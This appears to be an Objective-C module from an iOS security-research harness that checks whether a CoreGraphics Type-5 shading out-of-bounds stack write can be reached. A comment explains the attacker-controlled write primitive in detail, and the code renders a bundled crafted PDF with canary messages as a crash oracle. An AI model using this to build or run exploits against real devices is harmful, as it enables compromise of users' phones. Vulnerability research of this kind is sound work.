#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreGraphics/CoreGraphics.h>
#import <CoreText/CoreText.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// CoreGraphics Type-5 (lattice-form Gouraud) shading OOB write — CVE-2026-112611
// family, fixed only in iOS 27.2 (24B115).  Our build is 26.2b1, so the
// parse-time gate (range_dim == nc && nc <= 4) does not exist here at all: the
// whole /ShadingType 5 path is reachable with no guard.
//
// At draw time _cg_shading_type5_draw builds a 72-byte mesh record per vertex
// (color area at +0x20, room for nc components) and calls CGFunctionEvaluate,
// which writes R doubles — R being the /Function's /Range dimension, chosen by
// the PDF and unrelated to nc.  The record array is a STACK VLA, so with R > nc
// the writes walk up the frame.  A Type-4 function makes the written doubles
// arbitrary, so this is an attacker-chosen, arbitrary-depth stack write inside
// our own process, triggered by painting the page.
//
// Oracle design: post a canary BEFORE the render and one AFTER.  If only the
// first arrives, the write fired (the process is gone); if both arrive, the
// render completed — which for the crash oracle means the site is not reachable
// in this build.
// ===========================================================================
static NSString *ModRenderPDF(NSString *pdfName, NSString *tag) {
    NSString *path = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:pdfName];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
        return [NSString stringWithFormat:@"%@: %@ not in the bundle", tag, pdfName];

    NSURL *url = [NSURL fileURLWithPath:path];
    CFDataRef data = (CFDataRef)[NSData dataWithContentsOfURL:url];
    if (!data) return [NSString stringWithFormat:@"%@: could not read %@", tag, pdfName];
    CGDataProviderRef prov = CGDataProviderCreateWithCFData(data);
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithProvider(prov);
    CGDataProviderRelease(prov);
    if (!doc || CGPDFDocumentGetNumberOfPages(doc) < 1) {
        if (doc) CGPDFDocumentRelease(doc);
        return [NSString stringWithFormat:@"%@: not a readable PDF (%@)", tag, pdfName];
    }
    size_t pages = CGPDFDocumentGetNumberOfPages(doc);

    CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
    CGRect box = CGPDFPageGetBoxRect(page, kCGPDFMediaBox);
    size_t w = (size_t)(CGRectGetWidth(box) + 0.5), h = (size_t)(CGRectGetHeight(box) + 0.5);
    if (w < 64) w = 64;
    if (h < 64) h = 64;
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(NULL, w, h, 8, 0, cs,
                                             kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    if (!ctx) {
        CGPDFDocumentRelease(doc);
        return [NSString stringWithFormat:@"%@: no bitmap context", tag];
    }
    AveLog([NSString stringWithFormat:@"    %@: pages=%zu, canary BEFORE render of %@",
           tag, (unsigned long)pages, pdfName]);
    AvePost([NSString stringWithFormat:@"%@ BEFORE render of %@", tag, pdfName]);
    CGContextDrawPDFPage(ctx, page);      // <-- the write happens in this call
    CGContextRelease(ctx);

    AveLog([NSString stringWithFormat:@"    %@: canary AFTER render (survived)", tag]);
    AvePost([NSString stringWithFormat:@"%@ canary AFTER render (survived)", tag]);
    CGPDFDocumentRelease(doc);
    return [NSString stringWithFormat:@"%@: render returned without a fault (%@)", tag, pdfName];
}

NSString *ModCGShadingOOB(void) {
    AveLog(@"    CG Type-5 shading: CVE-2026-112611 OOB write (gate absent on 26.2b1)");
    // control first: a benign, in-bounds shading must render cleanly.  If the
    // CONTROL faults, the render path itself is the problem, not the bug.
    NSString *ctl = ModRenderPDF(@"control_shading_type5.pdf", @"CG-CTL");
    AveLog([NSString stringWithFormat:@"    control: %@", ctl]);
    AvePost([NSString stringWithFormat:@"CGCTL %@", ctl]);
    if ([ctl containsString:@"without a fault"]) {
        NSString *r = ModRenderPDF(@"crash_shading_type5.pdf", @"CG-OOB");
        AveLog([NSString stringWithFormat:@"    oracle: %@", r]);
        AvePost([NSString stringWithFormat:@"CGOOB %@", r]);
        return [NSString stringWithFormat:@"CG type-5: %@", r];
    }
    return [NSString stringWithFormat:@"CG type-5: CONTROL FAULTED (%@) - render path broken, not the bug", ctl];
}